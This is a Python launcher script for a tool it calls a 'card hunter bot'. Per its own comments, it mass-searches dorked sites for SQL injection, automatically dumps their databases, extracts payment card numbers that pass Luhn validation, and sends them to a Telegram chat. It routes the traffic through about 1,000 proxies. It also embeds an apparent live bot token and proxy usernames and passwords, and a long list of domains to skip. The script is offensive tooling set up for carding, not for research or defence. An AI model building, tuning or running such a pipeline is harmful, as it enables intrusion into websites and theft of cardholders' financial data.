#!/usr/bin/env python3
"""
MadyDorker — CARD HUNTER BOT
Finds actual card numbers via SQLi injection → database dumping → Luhn validation.
Uses ~1000 proxies (4 premium inline + 996 from proxies.csv) for massive concurrency.
"""

import os
from config_v3 import DorkerConfig
from main_v3 import main

def build_card_config() -> DorkerConfig:
    """Create a card-hunting config: SQLi + dumping pipeline enabled."""
    config = DorkerConfig()

    # ── Bot identity ──
    config.telegram_bot_token = os.getenv(
        "CARD_BOT_TOKEN", "8187477232:AAFKPHOiLduYeYr5sqLf-0C5grtPI9OzXzE"
    )
    config.telegram_chat_id = os.getenv("DORKER_CHAT_ID", "-1003720958643")
    config.telegram_group_id = os.getenv("DORKER_GROUP_ID", "-1003720958643")

    # ── Separate database ──
    config.sqlite_db_path = os.path.join(os.path.dirname(__file__), "dorker_cards.db")

    # ═══════════════════════════════════════════════════════════
    # ENABLE SQLi + DUMPING — this is how we find actual cards
    # Pipeline: crawl → find params → test SQLi → dump DB → extract cards
    # ═══════════════════════════════════════════════════════════
    config.sqli_enabled = True              # Detect SQL injection points
    config.dumper_enabled = True            # Auto-dump via DIOS/error-based
    config.dumper_blind_enabled = True      # Blind boolean/time-based extraction
    config.union_dump_enabled = True        # Union-based column extraction
    config.auto_dump_nosql = True           # NoSQL injection dumps too
    config.deep_crawl_sqli_limit = 15       # Test up to 15 param URLs per domain for SQLi

    # ═══════════════════════════════════════════════════════════
    # DISABLE everything that doesn't find cards
    # ═══════════════════════════════════════════════════════════
    config.port_scan_enabled = False        # Not relevant to card finding
    config.oob_sqli_enabled = False         # Too slow, low yield
    config.xss_enabled = False
    config.ssti_enabled = False
    config.nosql_enabled = False            # Keep auto_dump_nosql but skip detection-only
    config.lfi_enabled = False
    config.ssrf_enabled = False
    config.cors_enabled = False
    config.redirect_enabled = False
    config.crlf_enabled = False

    # ── Disable recon that doesn't help find cards ──
    config.subdomain_enum_enabled = False
    config.api_bruteforce_enabled = False
    config.dir_fuzz_enabled = False
    config.js_analysis_enabled = False
    config.flaresolverr_fallback = False

    # ── Disable gateway/cookie noise — user doesn't want these ──
    config.cookie_hunter_enabled = False    # B3/gateway cookies = noise
    config.cookie_extraction_enabled = False # Session cookies = noise
    config.ecom_checker_enabled = False     # Ecom platform detection = noise
    config.key_validation_enabled = False   # Gateway key validation = noise
    config.secret_extraction_enabled = False # Disabled — was flooding Telegram feed

    # ── Keep useful features ──
    config.deep_crawl_enabled = True        # Crawl to find param URLs for SQLi
    config.waf_detection_enabled = True     # Skip heavily protected sites
    config.ml_filter_enabled = True         # Filter junk URLs
    config.mady_bot_feed = True
    config.fast_precheck = True             # 2s HEAD check — skip dead sites fast
    config.cards_only_reporting = True      # ONLY report dumps with actual cards

    # ═══════════════════════════════════════════════════════════
    # DORKS — SQLi-focused priority dorks served FIRST every cycle
    # Regular 3.5M custom dorks fill remaining capacity
    # ═══════════════════════════════════════════════════════════
    config.priority_dork_file = os.path.join(
        os.path.dirname(__file__), "params", "sqli_card_dorks.txt"
    )

    # ═══════════════════════════════════════════════════════════
    # PROXY POOL — 4 premium inline + ~996 from CSV = ~1000 total
    # ═══════════════════════════════════════════════════════════
    config.proxy_urls = [
        "proxy.proxying.io:8080:Ahmaok:3nR1IcBsmj_quality-high",
        "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
        "px300902.pointtoserver.com:10780:purevpn0s5365583:abcd1234",
        "px990502.pointtoserver.com:10780:purevpn0s8732217:i67s60ep",
    ]
    config.proxy_url = ""  # Disable single env-var proxy
    # Also load the 996 public proxies from CSV
    config.proxy_files = ["/home/nulladmin/NullIsADork/proxies.csv"]

    # ═══════════════════════════════════════════════════════════
    # TIMEOUTS — SQLi testing needs more time than simple crawl
    # ═══════════════════════════════════════════════════════════
    config.url_process_timeout = 360        # 6min — SQLi detect (~15s) + enum (~15s) + dump cards/payments (~300s) + DIOS/privs (~30s)
    config.validation_timeout = 3           # Initial HTTP check
    config.ecom_probe_timeout = 2
    config.deep_crawl_timeout = 3           # Per crawl page fetch

    # ═══════════════════════════════════════════════════════════
    # PER-URL WORK — crawl enough to find injectable params
    # ═══════════════════════════════════════════════════════════
    config.deep_crawl_max_pages = 2         # Minimal crawl — most URLs already have params from dorks
    config.deep_crawl_max_depth = 1         # 1 level deep — speed over thoroughness
    config.deep_crawl_concurrent = 150
    config.deep_crawl_delay = 0.0
    config.secret_max_concurrent = 500
    # Skip deep crawl entirely if the URL already has query params (saves ~5s per URL)
    config.skip_crawl_if_has_params = True

    # ═══════════════════════════════════════════════════════════
    # MASSIVE PARALLELISM — ~1000 proxies, 16 cores, 30GB RAM
    # ═══════════════════════════════════════════════════════════
    config.concurrent_url_limit = 1000      # ~1 per proxy — dump extractions need sustained bandwidth
    config.max_concurrent_validations = 1000
    config.dork_batch_size = 60             # 60 dorks searched in parallel per batch

    # ═══════════════════════════════════════════════════════════
    # CYCLING — burn through dorks, maximize URL throughput
    # ═══════════════════════════════════════════════════════════
    config.search_delay_min = 0.05
    config.search_delay_max = 0.3
    config.cycle_delay = 1
    config.dorks_per_cycle = 1500
    config.cycle_max_urls = 15000           # Process 15K URLs per cycle
    config.cycle_max_time = 3600
    config.results_per_dork = 100

    # ═══════════════════════════════════════════════════════════
    # DOMAIN MANAGEMENT
    # ═══════════════════════════════════════════════════════════
    config.domain_revisit_hours = 6
    config.circuit_breaker_threshold = 3    # 3 fails before block (SQLi sites can be flaky)
    config.circuit_breaker_timeout = 1800   # 30min cooldown (was 1hr)
    config.min_content_length = 200         # Accept smaller pages with params

    # ═══════════════════════════════════════════════════════════
    # SKIP DOMAINS — massively expanded to eliminate junk URLs
    # ═══════════════════════════════════════════════════════════
    config.skip_domains = config.skip_domains + [
        # ── News / finance / reference ──
        "investing.com", "finviz.com", "marketscreener.com", "seekingalpha.com",
        "fool.com", "motleyfool.com", "morningstar.com", "barrons.com", "wsj.com",
        "cnbc.com", "bloomberg.com", "reuters.com", "ft.com", "usatoday.com",
        "forbes.com", "businessinsider.com", "cnn.com", "bbc.com", "bbc.co.uk",
        "nytimes.com", "theguardian.com", "washingtonpost.com", "finance.yahoo.com",
        "mordorintelligence.com", "statista.com", "vizologi.com",
        "businessmodelanalyst.com", "electronicpaymentsinternational.com",
        "cardpaymentoptions.com", "creditdonkey.com", "nerdwallet.com",
        "creditkarma.com", "bankrate.com", "thebalancemoney.com",
        "fintechfutures.com", "pymnts.com", "thepaypers.com",
        "paymentsjournal.com", "paymentsdive.com", "financialit.net",
        "freemalaysiatoday.com", "skai.gr", "parapolitika.gr", "antenna.gr",
        "athensmagazine.gr", "en.tempo.co", "techcrunch.com",
        # ── Payment processor corporate/docs ──
        "payoneer.com", "helcim.com", "fiserv.com", "firstdata.com",
        "softwareexpress.com.br", "fiserv.com.br", "dbs.com.sg", "wise.com",
        "dsgpay.com", "allianz-trade.com", "piraeusbank.gr", "nbg.gr",
        "chaniabank.gr", "anytime.gr", "eett.gr",
        "spreedly.com", "ixopay.com", "plaid.com", "moneris.com",
        "cybersource.com", "visaacceptance.com", "paymentplugins.com",
        # ── Job / career sites ──
        "myworkdayjobs.com", "workday.com", "greenhouse.io", "lever.co",
        "careers.com", "monster.com", "ziprecruiter.com", "careerbuilder.com",
        # ── Document / file hosting / academic ──
        "scribd.com", "slideshare.net", "issuu.com", "academia.edu",
        "researchgate.net", "arxiv.org", "sciencedirect.com", "pdfcoffee.com",
        "pdfagile.com", "pubchem.ncbi.nlm.nih.gov",
        # ── Software / dev tools ──
        "openoffice.org", "itch.io", "spacy.io", "sourceforge.net",
        "postman.com", "newrelic.com", "servicenow.com", "forge.puppet.com",
        "devexpress.com", "arubanetworking.hpe.com", "slurm.schedmd.com",
        "codecanyon.net", "xdaforums.com",
        # ── Wikipedia clones / review / knowledge bases ──
        "investopedia.com", "crunchbase.com", "pitchbook.com", "trustpilot.com",
        "g2.com", "capterra.com",
        # ── Social / forums / community ──
        "quora.com", "producthunt.com", "ycombinator.com", "lobste.rs",
        "slashdot.org", "deviantart.com", "support.patreon.com",
        # ── Crypto / wallet ──
        "metamask.io", "trustwallet.com", "bitcoin.com", "coindoo.com",
        "plisio.net", "privatekeyfinder.io", "wallet.google", "coinbase.com",
        "binance.com", "kraken.com", "crypto.com", "blockchain.com", "etherscan.io",
        # ── Developer tutorial / blog sites ──
        "c-sharpcorner.com", "cloudways.com", "oauth.com", "luxequality.com",
        "laravel.com", "jsoneditoronline.org", "medevel.com", "codeproject.com",
        "dzone.com", "towardsdatascience.com", "analyticsvidhya.com", "kaggle.com",
        "colab.research.google.com", "codingninjas.com", "programiz.com",
        "javatpoint.com", "guru99.com", "simplilearn.com", "educative.io",
        "codecademy.com", "udemy.com", "coursera.org", "edx.org", "pluralsight.com",
        "phpgurukul.com", "campcodes.com", "sourcecodester.com", "easyschema.com",
        # ── Market data / stock sites ──
        "marketbeat.com", "stockanalysis.com", "tradingview.com", "zacks.com",
        "macrotrends.net", "simplywall.st", "tipranks.com", "gurufocus.com",
        # ── Government / NGO / org ──
        "icpcacademy.gov.ng", "undp.org", "humanitarianoutcomes.org",
        "sanctionscanner.com", "cisa.gov", "afdc.energy.gov", "energy.gov",
        "climatetrace.org", "worldbank.org", "judiciary.gov.ph",
        "usa.gov", "sam.gov", "research.gov", "phmsa.dot.gov",
        "icp.gov.ae", "dubailand.gov.ae", "etihadbureau.ae",
        "gov.ph", "gov.au", "tamisemi.go.tz", "forestsclearance.nic.in",
        "nsf-gov-resources.nsf.gov", "nsfas.org.za", "trumpcard.gov", "myfss.us.af.mil",
        # ── General tech / irrelevant ──
        "help.ivanti.com", "petpooja.com", "filings.ae", "nationalbonds.ae",
        "safexpay.ae", "freelancer.com", "brandcrunch.com.ng",
        "essentials.availity.com",
        # ── Marketplace / ecommerce docs ──
        "etsy.com", "ebay.com", "taobao.com",
        # ── Press releases / logos / media ──
        "prnewswire.com", "seekvectorlogo.com", "craft.co", "unsplash.com",
        "reshot.com", "vectormine.com",
        # ── Gas station / energy ──
        "shell.com", "petron.com", "nayaraenergy.com", "nnpcgroup.com",
        "nn-group.com", "torrentgas.com", "cefcostores.com", "oldgas.com",
        "checkpetrolprice.com", "mahanagargas.com",
        # ── Insurance / utilities ──
        "allstate.com", "searshomeservices.com", "mlgw.com", "spglobal.com",
        # ── Travel / maps / classifieds ──
        "gocity.com", "numbeo.com", "ziplocal.com", "philkotse.com",
        # ── Misc junk from timeout logs ──
        "fairobserver.com", "globalriskcommunity.com", "upskills-finance.com",
        "simworkflow.com", "gbhackers.com", "motorola.com", "vevor.com",
        "upela.com", "skroutz.gr", "visiontop.fr", "sec2payindia.in",
        "inurl.com.br", "chaosads-australia.com", "chaosads-singapore.com",
        "mex.tl", "etsi.org", "cambridge.ca", "docs.confluent.io",
        "fileinfo.com", "bullydog.com",
        # ── Banking docs ──
        "lumbeeguarantybank.com", "icicidirect.com",
        # ── Education / quiz / learning ──
        "quizlet.com", "lumenlearning.com", "studenta.com",
        # ── CDN / website builders ──
        "cdn.website-editor.net", "cdn.jamanetwork.com",
        # ── Big corp sites (too protected, always timeout) ──
        "paypal.com", "mastercard.com", "visa.com", "americanexpress.com",
        "capitalone.com", "wellsfargo.com", "instagram.com", "netflix.net",
        "apple.com", "microsoft.com", "oracle.com", "ibm.com",
        "salesforce.com", "adobe.com", "dropbox.com",
        # ── Donation / nonprofit ──
        "donorperfect.com", "donorbox.org", "commitchange.com",
        "snowballfundraising.com", "neonone.com", "goodwillnj.org",
        "getfullyfunded.com", "worldoutreach.org", "charitynavigator.org",
        # ── Accounting / business tools ──
        "quickbooks.intuit.com", "saasant.com", "deluxe.com",
        "checkwriter.net", "routingtool.com",
        # ── Tech / support ──
        "ptc.com", "cnet.com", "auth0.com", "azure.com",
        "opster.com", "target.com", "dunkinbrands.com",
        "shopgate.com", "aquaapi.io",
        # ── Finance blogs / tools ──
        "loanscanada.ca", "piggybank.ca", "lendedu.com",
        "financefacts101.com", "thestockdork.com", "upflow.io",
        "tradingcharts.com", "wikiaccounting.com",
        # ── Misc ──
        "codepal.ai", "mage2.pro", "karuppiah.dev", "packagist.org",
        "t2t.org", "npifund.com", "aicpa-cima.com", "samaritan.org",
        "aa.com", "jrds.org", "karger.silverchair-cdn.com",
        "datatas.com", "datacalculus.com", "tokenizationserviceprovider.com",
        "weixin.qq.com", "kakao.com", "yaguor.com",
        # ── Chinese domains ──
        "zhihu.com", "chinadaily.com.cn", "dxy.cn", "i21st.cn", "graigar.cn",
        "editage.cn", "dict.cn", "sciencenet.cn", "epsq.cn", "humanrights.cn",
        "china-embassy.gov.cn", "sogou.com",
        # ── Social / review / listing sites (DataDome/Cloudflare) ──
        "yelp.com", "yelp.ca", "yelp.co.uk", "yelp.ie", "yelp.com.au",
        "tripadvisor.com", "tripadvisor.ca", "tripadvisor.co.uk", "tripadvisor.ie",
        "alltrails.com", "opentable.com", "opentable.co.uk",
        "ra.co", "mixkit.co", "alignable.com",
        # ── Big protected sites (Shape Security / heavy WAF) ──
        "icloud.com", "about.google", "google.com", "google.co.nz", "google.de",
        "translate.google.com", "translate.google.de", "images.google.co.nz",
        "msn.com", "foxsports.com", "waze.com", "n8n.io",
        "amazon.ie", "amazon.jobs", "amazon.co.uk", "amazon.com.au", "amazon.com",
        "pcgamer.com", "techradar.com", "makeuseof.com", "southernliving.com",
        "jmbullion.com", "thisgengaming.com", "grid.gg",
        # ── Real estate / classifieds ──
        "realestate.com.au", "allhomes.com.au", "onxmaps.com",
        # ── Food / restaurant / travel ──
        "foodinjapan.org", "culturalattache.co", "campendium.com",
        "countryboysbbq.net", "bourkesports.ie",
        # ── Ad / media / creative ──
        "adforum.com", "zadarma.com", "kbhgames.com", "kbh.games",
        "kbhgame.gitlab.io", "flightsim.to", "flightslogic.com",
        "airnavradar.com", "automationforum.co",
        # ── Irish / regional sites ──
        "hostingireland.ie", "alturacu.ie", "vhi.ie", "weare.ie",
        # ── Tech / SaaS docs ──
        "docusign.com", "support.docusign.com", "help.tableau.com",
        "scikit-learn.org", "dotnetspider.com", "toolsforyou.org",
        "herramientas-online.com",
        # ── NZ/AU academic ──
        "auckland.ac.nz",
        # ── Sleep / health / NGO ──
        "ncsleep.org", "rosewoodrhc.com", "psyche.co",
        "diariodepernambuco.com.br", "zambianmusicblog.co", "thetrek.co",
        # ── Financial services ──
        "remita.net", "avenza.com", "wintrustmortgage.com", "weldzone.org",
        # ── News/Yahoo variants ──
        "news.yahoo.com", "mail.yahoo.com", "yahoo.com",
        # ── Login portals ──
        "login.remita.net", "store.avenza.com",
        # ── Timeout/junk domains ──
        "pixabay.com", "pinterest.com", "pinterest.co.uk",
        "steamcommunity.com", "steam.com", "steampowered.com",
        "realpython.com", "wiley.com", "onlinelibrary.wiley.com",
        "wordplays.com", "tokyoway.jp", "gamer.com.tw",
        "tuxpaint.org", "transportgeography.org", "math.libretexts.org",
        "biorender.com", "desmos.com", "cuemath.com",
        "calculatorsoup.com", "calculator.net",
        "billboard.com", "espn.com", "espn.co.uk",
        "bbb.org", "zoominfo.com", "datanyze.com", "whitepages.com",
        "alaskaair.com", "elledecor.com", "evernote.com",
        "dokumen.pub", "alchetron.com", "cisdem.com", "chosic.com",
        "accuradio.com", "audiocleaner.ai",
        "blog.google", "b-europe.com",
        # ── Stock photo / media CDN ──
        "shutterstock.com", "gettyimages.com", "istockphoto.com", "pexels.com",
        # ── Porn ──
        "eporner.com", "pornhub.com", "xvideos.com", "xhamster.com",
        # ── Social media ──
        "twitter.com", "x.com", "facebook.com", "linkedin.com", "tiktok.com",
        "reddit.com", "tumblr.com", "snapchat.com",
        # ── Educational / reference ──
        "libretexts.org", "khanacademy.org", "britannica.com",
        "merriam-webster.com", "dictionary.com", "thesaurus.com",
        "answers.com", "quizizz.com",
        # ── Gaming / entertainment ──
        "ign.com", "gamespot.com", "kotaku.com", "polygon.com",
        "twitch.tv", "discord.com", "roblox.com", "minecraft.net",
        # ── Map / location ──
        "maps.google.com", "openstreetmap.org",
        # ── Linguee / translation ──
        "linguee.fr", "linguee.com", "linguee.de", "linguee.es",
        "deepl.com", "dict.cc",
        # ── Visa/payment info pages ──
        "visaeurope.at", "visaeurope.com",
        # ── More junk ──
        "wikihow.com", "allrecipes.com", "citizensbank.com",
        "thinkcalculator.com", "omnicalculator.com", "symbolab.com",
        "surveymonkey.com", "socrative.com", "codevscolor.com",
        "forms.office.com", "office.com",
        "newvision.co.ug", "independent.co.ug",
        "phppot.com", "developercommunity.visualstudio.com",
        "xe.com", "worldanimalprotection.us", "w3resource.com",
        "vocabulary.com", "thewindowsclub.com",
        "visualstudio.com", "visualstudio.microsoft.com",
        # ── v10b: Top timeout domains from first run ──
        "wallethub.com", "thepointsguy.com", "financebuzz.com",
        "upgradedpoints.com", "awardwallet.com", "cardplayer.com",
        "finder.com", "sillyrobotcards.com", "brandcrowd.com",
        "lovepik.com", "tecnobits.com", "ongoody.com",
        "poweredtemplate.com", "tradersunion.com", "clark.com",
        "cdphp.com", "phpzag.com", "webdevtrick.com", "boxpiper.com",
        "freepik.com", "postermywall.com", "anglophone-direct.com",
        "duo.com", "angular.dev", "docs.angular.lat",
        "walmart.com", "walgreens.com", "cvs.com", "nordstrom.com",
        "att.com", "wireless.att.com", "nsf.gov",
        "sage.com", "gb-kb.sage.com", "webmd.com",
        "template.net", "java-samples.com", "ibps.in",
        "charitywatch.org", "granicus.com", "propublica.org",
        "pnp.co.za", "pa.gov", "olevelexam.com", "liveagent.com",
        "lifewire.com", "ip-tracker.org", "haier.com", "grocerycard.com",
        "everettofficefurniture.com", "fastercapital.com",
        "phoenixnap.com", "nextcloud.com", "apps.nextcloud.com",
        # ── v10c: More timeout domains ──
        "nsf.org", "rcbc.com", "bpi.com.ph", "bdo.com.ph",
        "leagueoflegends.com", "riotgames.com", "developer.riotgames.com",
        "aspose.app", "products.aspose.app", "deepwiki.com",
        "signnow.com", "sitepoint.com", "textverified.com",
        "tax-id-bureau.com", "w3docs.com", "webslesson.info",
        "pacer.psc.uscourts.gov", "tceq.texas.gov", "grants.ca.gov",
        "doh.wa.gov", "readthedocs.io",
    ]

    # ═══════════════════════════════════════════════════════════
    # URL PATH FILTERING — skip non-injectable URL patterns
    # ═══════════════════════════════════════════════════════════
    config.skip_url_path_patterns = [
        "/blog/", "/article/", "/articles/", "/news/", "/press-release",
        "/wiki/", "/help/", "/support/", "/faq/", "/about/", "/about-us",
        "/terms", "/privacy", "/legal/", "/policy/", "/cookie-policy",
        "/careers/", "/jobs/", "/hiring", "/job-posting",
        "/research/", "/whitepaper", "/case-study", "/case-studies",
        "/investor", "/annual-report", "/sustainability",
        "/tutorial", "/how-to/", "/guide/", "/learn/", "/course/",
        "/documentation/", "/docs/api", "/api-reference",
        "/forum/", "/community/", "/discussion",
        "/podcast/", "/video/", "/webinar", "/event/",
        "/press/", "/media/", "/newsroom",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        "/seller-handbook", "/art/", "/gallery/",
        "/science/article", "/abstract/", "/pubmed/",
        "/slide/", "/presentation/",
        "/recipe/", "/recipes/", "/calculator/", "/calculate",
        "/math/", "/finance/simple-interest", "/interest-calculator",
        "/coloring-pages", "/printable", "/crafts/",
        "/pin/", "/review/", "/reviews/",
        "/weather/", "/horoscope/", "/sitemap",
    ]

    # ── Separate storage files ──
    config.found_sites_file = os.path.join(os.path.dirname(__file__), "found_sites_cards.json")
    config.seen_domains_file = os.path.join(os.path.dirname(__file__), "seen_domains_cards.txt")
    config.vulnerable_urls_file = os.path.join(os.path.dirname(__file__), "vulnerable_urls_cards.json")
    config.gateway_keys_file = os.path.join(os.path.dirname(__file__), "gateway_keys_cards.json")

    return config


if __name__ == "__main__":
    main(build_card_config())
